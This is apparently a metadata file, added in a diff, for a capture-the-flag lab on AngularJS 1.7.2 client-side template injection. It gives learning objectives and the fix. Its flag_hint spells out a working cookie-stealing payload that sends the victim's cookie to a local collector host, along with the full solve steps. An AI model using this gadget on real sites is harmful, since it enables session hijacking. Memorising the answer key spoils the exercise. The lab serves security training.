@@ -1,0 +1,44 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "angularjs-sandbox-escape-172",
+  "title": "AngularJS 1.7.2 Client-Side Template Injection (sandbox-less)",
+  "track": "xss",
+  "difficulty": "expert",
+  "estimated_minutes": 45,
+  "max_lifetime_minutes": 60,
+  "learning_objectives": [
+    "Recognise client-side template injection (CSTI): user data reflected into an AngularJS-compiled region is evaluated as an {{ }} expression, not just rendered as HTML",
+    "Understand why HTML-escaping the reflection does NOT stop CSTI — the browser decodes the entities into a text node before AngularJS parses the interpolation",
+    "Know that AngularJS 1.6+ removed the expression sandbox, so a constructor gadget reaches the Function constructor for arbitrary JavaScript",
+    "Build a {{ constructor.constructor(\"...\")() }} gadget whose quotes survive html.escape and exfiltrate the victim's non-HttpOnly session cookie to an OOB collector",
+    "See that the fix is to keep untrusted data OUT of the Angular-compiled region (ng-non-bindable / $sce / server-side rendering that never emits user data into an interpolation context), not to escape harder"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["reflected-xss-search-noescape"],
+  "flag_hint": "Submit /?name={{constructor.constructor(\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\")()}} (URL-encoded) to POST /report. HTML-escaping does not stop AngularJS 1.7.2 from evaluating the {{}} in the admin bot's browser; it beacons its session cookie to the collector. Read it via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "AngularJS 1.7.2 (vendored; sandbox-less {{}} template injection)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "csti",
+    "client-side-template-injection",
+    "angularjs",
+    "sandbox-escape",
+    "cookie-theft",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The AngularJS sandbox-escape / client-side template injection class (PortSwigger CSTI research and the 1.6 sandbox removal), abstracted for local Docker with a Playwright victim bot and an OOB collector. Ships AngularJS 1.7.2 deliberately because that sandbox-less version is the vulnerability."
+}
